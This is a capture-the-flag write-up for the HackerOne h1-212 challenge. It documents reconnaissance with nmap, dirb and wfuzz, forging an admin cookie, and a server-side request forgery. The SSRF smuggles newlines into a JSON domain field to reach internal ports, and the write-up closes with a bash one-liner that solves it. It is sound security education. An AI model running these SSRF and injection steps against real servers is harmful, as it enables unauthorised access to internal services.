The h1-212 CTF

TL;DR 
Bash 1-liner to solve the challenge that can be run on OS X or most any linux box with curl, awk, and base64:

```
curl -H "Content-Type: application/json" -H "Host: admin.acme.org" -b admin=yes \
http://104.236.20.43/read.php?id=`curl -H "Content-Type: application/json" \
-H "Host: admin.acme.org" -b admin=yes -d "{\"domain\":\"212\n127.0.0.1:1337/flag\n.com\"}" \
http://104.236.20.43/ -s|awk -F\= '{print $2}'|awk -F \" '{print $1-1}'` -s|awk -F\" \
'{print $4}'| base64 --decode
```

Background:
An engineer of acme.org launched a new server for a new admin panel at http://104.236.20.43/. He is completely confident that the server can’t be hacked. He added a tripwire that notifies him when the flag file is read. He also noticed that the default Apache page is still there, but according to him that’s intentional and doesn’t hurt anyone. Your goal? Read the flag!

First plan of attack, get a lay of the land. What ports are open, what software is running, what obvious content is available.
Portscan: nmap -Pn -p1-65535 104.236.20.43

```
Nmap scan report for 104.236.20.43
Host is up (0.058s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1276.07 seconds
```

Looks like there are only 2 ports open, SSH and HTTP. Since we were given a URL for a web admin panel, it's likely to assume that this challenge is going to revolve around the HTTP service.

When I test things, I like to do things as manually as possible. I typically use tools like telnet so I can manipulate HTTP directly. Let's see what version of apache is running.

```
$ telnet 104.236.20.43 80
Trying 104.236.20.43...
Connected to 104.236.20.43 (104.236.20.43).
Escape character is '^]'.
HEAD / HTTP/1.0

HTTP/1.1 200 OK
Date: Sat, 18 Nov 2017 02:14:03 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Thu, 09 Nov 2017 22:25:49 GMT
ETag: "2c39-55d9449450f96"
Accept-Ranges: bytes
Content-Length: 11321
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
```

Looks like it is running Apache/2.4.18. A quick google search finds 10 vulnerabilities with CVSS Scores ranging from 4.3-7.5 including the "named" vulnerability Optionsbleed.

https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-199589/Apache-Http-Server-2.4.18.html

I tried the publicly available proof of concept exploits for each of the vulnerabilities and read through all the apache patches for the CVEs that didn't have public exploits, but determined that either this is going to be the most badass CTF where we'd need to write our own exploit or there is another way to manipulate a web app.

Opting to believe that this challenge was doable in a reasonable timeframe by people who probably have day jobs, I decided to start looking for another way. I opted for poking around the host with a couple tools.

Tool #1: dirb

```
$ dirb http://104.236.20.43/ /usr/share/dirb/wordlists/common.txt -w

---- Scanning URL: http://104.236.20.43/ ----
+ http://104.236.20.43/flag (CODE:200|SIZE:56)                                                                                     
+ http://104.236.20.43/index.html (CODE:200|SIZE:11321)                                                                            
+ http://104.236.20.43/server-status (CODE:403|SIZE:301)                                                                           
                                                                                                                                   
-----------------
DOWNLOADED: 4612 - FOUND: 3
```

I found a flag! But as Obi-Wan once said, this isn't the flag you're looking for:

```
$ telnet 104.236.20.43 80
Trying 104.236.20.43...
Connected to 104.236.20.43.
Escape character is '^]'.
GET /flag HTTP/1.0

HTTP/1.1 200 OK
Date: Sat, 18 Nov 2017 03:38:36 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Mon, 13 Nov 2017 15:58:29 GMT
ETag: "38-55ddf5767a623"
Accept-Ranges: bytes
Content-Length: 56
Connection: close

You really thought it would be that easy? Keep digging!
```

Knowing that this the URL was referred to as an "admin panel" it seemed to me that there might be multiple virtual hosts hosted on the ip. To find some other potential hostnames, I turned to a GitHub project by Jobert Abma named virtual-host-discovery. Note that I told the tool to ignore content-length of 11321 which was returned when I originally telnetted to the host above.

https://github.com/jobertabma/virtual-host-discovery

Tool #2: virtual-host-discovery

```
$ruby scan.rb --ip=104.236.20.43 --host=acme.org --wordlist=wordlist --ignore-content-length=11321
Found: admin.acme.org (200)
 date:
 Sat, 18 Nov 2017 04:20:37 GMT
 server:
 Apache/2.4.18 (Ubuntu)
 set-cookie:
 admin=no
 content-type:
 text/html; charset=UTF-8
 Start writing final results
 Finish writing final results
```

Now that I have a hostname, now I needed to figure out what I could do with it! First, for ease of interacting with the virtual host, I added an /etc/hosts entry for admin.acme.org. Then I ran dirb again:

```
$ dirb http://admin.acme.org/ /usr/share/dirb/wordlists/common.txt -w
	
---- Scanning URL: http://admin.acme.org/ ----
+ http://admin.acme.org/index.php (CODE:200|SIZE:0)                                                                                             
+ http://admin.acme.org/server-status (CODE:403|SIZE:302)                                                                                       
                                                                                                                                                
-----------------
DOWNLOADED: 4612 - FOUND: 2
```

Ah-ha! This thing virtual host is running a php script! Noticing from the virtual-host-discovery tool that it is setting an cookie too, we can get to work tampering with the parameters! Seeing that there is a cookie named admin set to "no" it's obvious to me that it is screaming to be set to yes. For giggles, I created a text file with several potential values of admin (no, yes, flag, maybe, true, false, etc) and ran wfuzz to test to see if I could get a change out of the script (other than the 200 response code I already got).

Tool #3: wfuzz

```
$ wfuzz -b "admin=FUZZ" -zfile,admin_cookie.txt --hc 200 http://admin.acme.org/

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

00002:  C=405      0 L	       0 W	      0 Ch	  "yes"
```

There it is, "admin=yes" changed the response code from a 200 to a 405. Now we are getting somewhere! Once I figured out the correct cookie value, the server is almost screaming at me that my method type isn't correct so I tried some other method types.


Attempt #1:

```
$ telnet admin.acme.org 80
Trying 104.236.20.43...
Connected to admin.acme.org.
Escape character is '^]'.
GET / HTTP/1.1
Host: admin.acme.org
Cookie: admin=yes

HTTP/1.1 405 Method Not Allowed
Date: Sat, 18 Nov 2017 04:34:30 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Attempt #2:

```
$ telnet admin.acme.org 80
Trying 104.236.20.43...
Connected to admin.acme.org.
Escape character is '^]'.
OPTIONS / HTTP/1.1
Host: admin.acme.org
Cookie: admin=yes

HTTP/1.1 405 Method Not Allowed
Date: Sat, 18 Nov 2017 04:35:45 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Attempt #3:

```
$ telnet admin.acme.org 80
Trying 104.236.20.43...
Connected to admin.acme.org.
Escape character is '^]'.
POST / HTTP/1.1
Host: admin.acme.org
Cookie: admin=yes

HTTP/1.1 406 Not Acceptable
Date: Sat, 18 Nov 2017 04:36:38 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Did you see that? "406 Not Acceptable" instead of "405 Method Not Allowed". This is why I like to telnet and do these things manually. Using a tool, you might miss the nuance in the response code. Just to make sure that the 406 wasn't a fluke, I crafted an actual POST request with some data to ensure that the response code wasn't just because I didn't actually send any data.

Attempt #4:

```
$ telnet admin.acme.org 80
Trying 104.236.20.43...
Connected to admin.acme.org.
Escape character is '^]'.
POST / HTTP/1.1
Host: admin.acme.org
Cookie: admin=yes
Content-Length: 12

flag=yes

HTTP/1.1 406 Not Acceptable
Date: Sat, 18 Nov 2017 04:55:18 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Now, I feel confident that crafting a POST is the right direction to go since I still receive a 406 return code, but what now is making my request "Not Acceptable". At this point, I feel like I'm on the right track, but I'm a little lost as to where to go to next. Thinking that there might be other headers I need to tamper with, for some horrible reason, I decide that I should manipulate the User-Agent header. I grabbed a bunch of user-agents from a random GitHub repo and went to town with wfuzz again.

https://github.com/nlf/browser-agents/blob/master/user_agents.txt

```
$ wfuzz -H "User-Agent: FUZZ" -b "admin=yes" -d "flag=true" -zfile,user_agents.txt --hc 406 http://admin.acme.org/
```

User agents didn't yield and different response codes from the site so I moved onto what *should* have been a more obvious choice of manipulating Content-Type. I found a decent list of popular Content-Types on GitHub and again used wfuzz to see if I could get the application to respond differently.

https://gist.githubusercontent.com/gmetais/971ce13a1fbeebd88445/raw/c07b608facc01f1e2d276f8ce2469dff88735d4f/gzip-conf.txt

```
$ wfuzz -H "Content-Type: FUZZ" -b "admin=yes" -d "flag=true" -zfile,gzip-conf.txt --hc 406 http://admin.acme.org/

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

00009:  C=418      0 L	       3 W	     37 Ch	  "application/json"
```

Breakthrough! Using Content-Type "application/json" turns the app into a teapot :) (https://httpstatuses.com/418). Now that we know that the application is expecting some JSON, let's see if we can get it to feed us a flag. Could it be so easy?

Tool #4: curl

Attempt #1:

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"flag\":\"true\"}" http://admin.acme.org/ -v
*   Trying 104.236.20.43...
* TCP_NODELAY set
* Connected to admin.acme.org (104.236.20.43) port 80 (#0)
> POST / HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.54.0
> Accept: */*
> Cookie: admin=yes
> Content-Type: application/json
> Content-Length: 15
> 
* upload completely sent off: 15 out of 15 bytes
< HTTP/1.1 418 I'm a teapot
< Date: Sat, 18 Nov 2017 05:22:59 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Content-Length: 31
< Content-Type: application/json
< 
* Connection #0 to host admin.acme.org left intact
{"error":{"domain":"required"}}
```

At this point, I'm reminded that developers who write APIs tend to be helpful and give us clues as to how to interact with them.

Attempt #2:

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"admin.acme.org\"}" http://admin.acme.org/ -v
...
{"error":{"domain":"incorrect value, .com domain expected"}}
```

Attempt #3:

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"admin.acme.com\"}" http://admin.acme.org/ -v
...
{"error":{"domain":"incorrect value, sub domain should contain 212"}}
```

Attempt #4:

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"212.acme.com\"}" http://admin.acme.org/ -v
...
{"next":"\/read.php?id=0"}
```

Woah! We are onto something! Could it be so easy? What is read.php? Let's try to hit that up!

Attempt #1:

```
$ curl -H "Content-Type: application/json" -b admin=yes http://admin.acme.org/read.php?id=0 -v
*   Trying 104.236.20.43...
* TCP_NODELAY set
* Connected to admin.acme.org (104.236.20.43) port 80 (#0)
> GET /read.php?id=0 HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.54.0
> Accept: */*
> Cookie: admin=yes
> Content-Type: application/json
> 
< HTTP/1.1 200 OK
< Date: Sat, 18 Nov 2017 05:31:03 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Content-Length: 11
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host admin.acme.org left intact
{"data":""}
```

Attempt #2:

```
$ curl -H "Content-Type: application/json" -b admin=yes http://admin.acme.org/read.php?id=1 -v
*   Trying 104.236.20.43...
* TCP_NODELAY set
* Connected to admin.acme.org (104.236.20.43) port 80 (#0)
> GET /read.php?id=1 HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.54.0
> Accept: */*
> Cookie: admin=yes
> Content-Type: application/json
> 
< HTTP/1.1 200 OK
< Date: Sat, 18 Nov 2017 05:31:49 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Content-Length: 11
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host admin.acme.org left intact
{"data":""}
```

Attempt #3:

```
$ curl -H "Content-Type: application/json" -b admin=yes http://admin.acme.org/read.php?id=2 -v
*   Trying 104.236.20.43...
* TCP_NODELAY set
* Connected to admin.acme.org (104.236.20.43) port 80 (#0)
> GET /read.php?id=2 HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.54.0
> Accept: */*
> Cookie: admin=yes
> Content-Type: application/json
> 
< HTTP/1.1 404 Not Found
< Date: Sat, 18 Nov 2017 05:32:35 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Content-Length: 33
< Content-Type: application/json
< 
* Connection #0 to host admin.acme.org left intact
{"error":{"row":"incorrect row"}}
```

OK THAT is interesting. It seems that after we post something to the index.php, possibly, records get created for read.php to retrieve. We are coming to the crazy rabbit hole portion of the challenge! Knowing that the sub domain needs to contain 212 and end in .com I wonder if I can create my own, so I created 212.tompohl.com to point at 127.0.0.1.

Attempt #4:

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"212.tompohl.com\"}" http://admin.acme.org/ -v
*   Trying 104.236.20.43...
* TCP_NODELAY set
* Connected to admin.acme.org (104.236.20.43) port 80 (#0)
> POST / HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.54.0
> Accept: */*
> Cookie: admin=yes
> Content-Type: application/json
> Content-Length: 28
> 
* upload completely sent off: 28 out of 28 bytes
< HTTP/1.1 200 OK
< Date: Sat, 18 Nov 2017 05:40:32 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Content-Length: 26
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host admin.acme.org left intact
{"next":"\/read.php?id=1"}

$ curl -H "Content-Type: application/json" -b admin=yes http://admin.acme.org/read.php?id=1 -v
*   Trying 104.236.20.43...
* TCP_NODELAY set
* Connected to admin.acme.org (104.236.20.43) port 80 (#0)
> GET /read.php?id=1 HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.54.0
> Accept: */*
> Cookie: admin=yes
> Content-Type: application/json
> 
< HTTP/1.1 200 OK
< Date: Sat, 18 Nov 2017 05:40:40 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
< 
{"data":"CjwhRE9DVF
......
5Pgo8L2h0bWw+Cgo="}
```

We've got a BUNCH of base64 encoded data!! I go to decode it expecting it to be a document extolling my technical prowess and I find the default apache page from the original admin panel. Instantly, I remember that there was a /flag URL on that host. Thinking that maybe somehow if I requested that URL from the server it would deliver a different message than "You really thought it would be that easy? Keep digging!"

Attempt #5 through #150:

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"212.tompohl.com/flag.com\"}" http://admin.acme.org/ -v
...
{"next":"\/read.php?id=2"}

$ curl -H "Content-Type: application/json" -b admin=yes http://admin.acme.org/read.php?id=2 -v
...
{"data":"PCFET0NUWVBFIEhUTUwgUFV
...
PC9odG1sPgo="}
```

I attempt to figure out how I can request the /flag while keeping .com on the end, so I start discovering the input validation of the script. I find almost every possible way to NOT request the flag.

Examples:

```
$ -d "{\"domain\":\"212.tompohl.com/flag%00.com\"}"
{"error":{"domain":"domain cannot contain %"}}

$ -d "{\"domain\":\"212.tompohl.com/flag#00.com\"}"
{"error":{"domain":"domain cannot contain #"}}

...

$ -d "{\"domain\":\"212.tompohl.com/flag\!00.com\"}"
{"error":{"body":"unable to decode"}}
```

I even attempt to do string concatenation similar to SQL injection attempts. Nada, nothing, no dice. At this point, I'm almost reaching the "too stupid to give up" portion of the challenge. At some point, I think "what about a carriage return!" and BOOM jackpot!

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"212.tompohl.com/flag\n.com\"}" http://admin.acme.org/ -v
...
{"next":"\/read.php?id=164"}
```

An interesting note is that when I added the \n now the id skipped by 2! and when I read the id just before the current "next" value I retrieved this:

```
$ curl -H "Content-Type: application/json" -b admin=yes http://admin.acme.org/read.php?id=163 -v
...
{"data":"WW91IHJlYWxseSB0aG91Z2h0IGl0IHdvdWxkIGJlIHRoYXQgZWFzeT8gS2VlcCBkaWdnaW5nIQo="}
```

Could this be it? Have I finally done it? I can barely contain myself as I decode the flag: "You really thought it would be that easy? Keep digging!"
(insert Darth Vader Noooooo meme)

I'm pretty sure this is the point where I started drinking. I stepped away, walked around the office, let my mind wander and came back to the task a while later. I read through my notes and go back and remember that /server-status is active on apache, but it was forbidden! I instantly remember that I know that apache server-status is allowed from 127.0.0.1 by default if you never changed the default configuration. 

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"212.tompohl.com/server-status\n.com\"}" http://admin.acme.org/ -v
$ curl -H "Content-Type: application/json" -b admin=yes http://admin.acme.org/read.php?id=165 -v
...
{"data":"PCFET0NUWVBFIEhUTUwg
...
CjwvYm9keT48L2h0bWw+Cg=="}
```

Sure enough! /server-status returns all of the other poor souls pounding away on the poor server. I might have spent far too much time requesting this page over and over again hoping to see a request to a secret URL that I need to retrieve. The elusive URL wasn't going to present itself. Then I think "If I can hit /server-status, maybe there's another service running on the host that I can hit from the inside of the box!" I first test my theory with a working /flag URL but add a :80 in the URL.

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"212.tompohl.com:80/flag\n.com\"}" http://admin.acme.org/ -v
```

That still worked! So now I just need to manipulate :80 until I find another port! It literally took me 3 additional tries (81, 8080, and then 1337):

Money Shot:

```
$ curl -H "Content-Type: application/json" -b admin=yes -d "{\"domain\":\"212.tompohl.com:1337/flag\n.com\"}" http://admin.acme.org/ -v
$ curl -H "Content-Type: application/json" -b admin=yes http://admin.acme.org/read.php?id=1billion -v ;)
...
{"data":"RkxBRzogQ0YsMmRzVlwvXWZSQVlRLlRERXBgdyJNKCVtVTtwOSs5RkR7WjQ4WCpKdHR7JXZTKCRnN1xTKTpmJT1QW1lAbmthPTx0cWhuRjxhcT1LNTpCQ0BTYip7WyV6IitAeVBiL25mRm5hPGUkaHZ7cDhyMlt2TU1GNTJ5OnovRGg7ezYK"}
```

When I decoded the data section I could hardly believe it! The FLAG!!

```
FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6
```

Thank you SO MUCH for this awesome challenge! It was quite the brain teaser!

I hope to get to meet all of you in New York!
-Tom

Tom Pohl
@tompohl - twitter
